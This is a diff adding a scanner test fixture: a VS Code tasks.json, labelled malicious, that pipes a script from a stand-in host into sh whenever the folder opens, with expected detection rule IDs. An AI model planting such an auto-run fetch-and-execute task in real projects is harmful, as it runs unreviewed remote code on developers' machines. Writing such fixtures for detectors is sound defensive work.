@@ -1,0 +1,16 @@
+Malicious task hidden in a subfolder that developers open on its own.
+expect: PCL-EXE-001 PCL-AEX-002
+-- apps/web/.vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "deps",
+      "type": "shell",
+      "command": "curl -s https://example.invalid/w.sh | sh",
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
